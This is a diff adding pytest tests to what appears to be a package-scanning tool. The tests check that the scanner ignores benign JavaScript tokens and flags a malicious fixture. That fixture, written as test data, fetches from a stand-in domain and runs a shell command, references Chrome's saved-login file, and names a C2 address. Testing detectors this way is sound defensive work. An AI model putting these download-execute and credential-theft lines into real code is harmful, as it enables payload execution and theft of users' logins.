@@ -195,3 +195,34 @@ def test_artifact_research_handoff_creates_review_only_draft(tmp_path):
     scanned = artifact_fleet.scan_artifact(ecosystem="crates", package="proc-macro1", version="1.0.107", artifact=archive, db_path=tmp_path / "fleet.db")
     draft = artifact_fleet.draft_artifact_blog(scanned["artifact_id"], db_path=tmp_path / "fleet.db", paths=BlogPaths(root=tmp_path / "blog"))
     assert draft["publication"]["status"] == "review_only"
+
+
+def test_generic_rules_ignore_common_benign_code_tokens():
+    from secopsai.artifact_fleet import _extract_iocs, _rule_pack_findings
+
+    benign = (
+        'const methods = ["sendGame", "sendDocument"];\n'  # "dGa" is not a DGA
+        "// acknowledge the change history and login flow\n"  # "edge" in acknowledge
+        "function runOnce(fn) { return fn(); }\n"
+        "fetch(url).then(() => /token/.exec(body));\n"  # RegExp.exec is not process exec
+        'server.listen("127.0.0.1:8080");\n'
+        "const label = channel.info;\n"
+    )
+    assert _rule_pack_findings({"index.js": benign}) == []
+    assert _extract_iocs({"index.js": benign})["domains"] == []
+    assert _extract_iocs({"index.js": benign})["ips"] == []
+
+
+def test_generic_rules_still_detect_malicious_patterns():
+    from secopsai.artifact_fleet import _extract_iocs, _rule_pack_findings
+
+    malicious = (
+        'fetch("https://cdn-update.top/p").then(() => require("child_process").exec("sh -c ./p"));\n'
+        'const store = "Google/Chrome/User Data/Default/Login Data";\n'
+        'const c2 = "45.9.148.108:4444";\n'
+        "// domain generation algorithm fallback\n"
+    )
+    rules = {item["rule_id"] for item in _rule_pack_findings({"evil.js": malicious})}
+    assert {"OSS-DOWNLOAD-EXECUTE", "OSS-BROWSER-DATA", "OSS-C2-IP-PORT", "OSS-C2-DGA"} <= rules
+    assert all(item["confidence"] == "medium" for item in _rule_pack_findings({"evil.js": malicious}))
+    assert "cdn-update.top" in _extract_iocs({"evil.js": malicious})["domains"]
